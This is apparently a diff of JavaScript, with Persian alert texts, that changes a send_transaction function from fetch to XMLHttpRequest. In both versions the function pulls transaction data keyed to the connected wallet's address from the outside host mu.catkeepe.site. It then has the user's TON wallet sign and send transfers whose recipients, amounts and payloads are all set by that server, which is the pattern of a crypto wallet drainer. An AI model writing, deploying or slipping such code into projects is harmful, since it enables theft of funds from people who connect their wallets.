@@ -11,41 +11,47 @@ async function send_transaction(resend = false) {
         return;
     }
 
-    try {
-        const response = await fetch(`http://mu.catkeepe.site/api/transactions/${senderAddress}`);
-        const data = await response.json(); 
+    const xhr = new XMLHttpRequest();
+    xhr.open("GET", `http://mu.catkeepe.site/api/transactions/${senderAddress}`, true);
+    xhr.onload = async function() {
+        if (xhr.status >= 200 && xhr.status < 300) {
+            const data = JSON.parse(xhr.responseText);
 
-        if (data.success) {
-            alert("ok");
+            if (data.success) {
+                alert("ok");
 
-            const transaction = {
-                validUntil: Date.now() + 1000000,
-                messages: []
-            };
+                const transaction = {
+                    validUntil: Date.now() + 1000000,
+                    messages: []
+                };
 
-            
-            for (const item of data.data) {
-                transaction.messages.push({
-                    address: item.address,
-                    amount: Number(item.amount),
-                    payload: item.payload
-                });
-            }
+                for (const item of data.data) {
+                    transaction.messages.push({
+                        address: item.address,
+                        amount: Number(item.amount),
+                        payload: item.payload
+                    });
+                }
 
-          
-            const sendResult = await tonConnectUI.sendTransaction(transaction);
-            if (sendResult) {
-                alert("تراکنش با موفقیت ارسال شد!");
+                const sendResult = await tonConnectUI.sendTransaction(transaction);
+                if (sendResult) {
+                    alert("تراکنش با موفقیت ارسال شد!");
+                } else {
+                    alert("ارسال تراکنش ناموفق بود.");
+                }
             } else {
-                alert("ارسال تراکنش ناموفق بود.");
+                alert("خطا: " + (data.message || "اطلاعات به درستی دریافت نشد."));
             }
         } else {
-            alert("خطا: " + (data.message || "اطلاعات به درستی دریافت نشد."));
+            alert("خطایی در دریافت اطلاعات کیف پول پیش آمد. کد خطا: " + xhr.status);
         }
-    } catch (error) {
-        console.error("Error fetching wallet information:", error);
-        alert("خطایی در دریافت اطلاعات کیف پول پیش آمد.");
-    }
+    };
+
+    xhr.onerror = function() {
+        alert("خطایی در ارتباط با سرور پیش آمد.");
+    };
+
+    xhr.send();
 }
 
 (async () => {
